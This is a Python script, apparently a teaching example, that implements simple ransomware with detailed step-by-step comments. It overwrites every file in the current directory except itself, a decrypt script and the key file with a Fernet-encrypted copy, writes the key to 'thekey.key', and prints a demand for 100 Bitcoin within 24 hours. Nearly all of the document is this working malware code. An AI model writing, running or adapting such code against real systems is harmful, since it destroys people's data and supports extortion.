
#  ____  ___          ___.                      ____  ___
#  \   \/  /__________\_ |__   ___________  ____\   \/  /
#   \     // __ \_  __ \ __ \_/ __ \_  __ \/  _ \\     / 
#   /     \  ___/|  | \/ \_\ \  ___/|  | \(  <_> )     \ 
#  /___/\  \___  >__|  |___  /\___  >__|   \____/___/\  \
#        \_/   \/          \/     \/                  \_/

# This script encrypts all files in the current directory except for specific ones.
# It uses the Fernet encryption method from the cryptography library.

# First, we need to import the required libraries.

# The `os` library provides functions to interact with the operating system.
# We will use it to list and manage files in the current directory.
import os

# The `Fernet` class from the `cryptography.fernet` module provides symmetric encryption.
# Symmetric encryption uses the same key for both encryption and decryption.
from cryptography.fernet import Fernet

# To use the `cryptography` library, you need to install it first.
# Open your system's terminal and type: pip3 install cryptography
# `pip` is a package manager for Python, and it will be available if Python3 is installed.
# If the script fails due to missing libraries, ensure `cryptography` is installed.

# Create an empty list to store the names of files we want to encrypt.
files = []

# Loop through each file in the current directory.
for file in os.listdir():
    
    # We need to exclude the script itself, the encryption key file, and the decryption script
    # to avoid encrypting these files.
    if file == "ransomware.py" or file == "thekey.key" or file == "decrypt.py" or file == "Ransomware.py" or file == "Decrypt.py":
        continue

    # Check if the item is a file and not a directory.
    if os.path.isfile(file):
        # Add the file to our list of files to encrypt.
        files.append(file)

# Generate a new encryption key using Fernet.
key = Fernet.generate_key()

# Save the encryption key to a file so it can be used later for decrypting the files.
with open("thekey.key", "wb") as thekey:
    thekey.write(key)

# Now that we have our list of files and the encryption key, we will start encrypting the files.

# Loop through each file in the list.
for file in files:
    # Open the file in read-binary mode to read its contents.
    with open(file, "rb") as thefile:
        contents = thefile.read()

    # Encrypt the contents using the generated encryption key.
    contents_encrypted = Fernet(key).encrypt(contents)

    # Open the file in write-binary mode to overwrite it with the encrypted contents.
    with open(file, "wb") as thefile:
        thefile.write(contents_encrypted)

# Print a message informing the user that all files have been encrypted.
# The message demands a ransom in Bitcoin to recover the files.
print("All files have been encrypted. Send me 100 Bitcoin within the next 24 hours or you will never recover your information.")

# The script is complete. All text files in the folder are now encrypted.
# To verify, run this script and try opening the text files that were previously created.
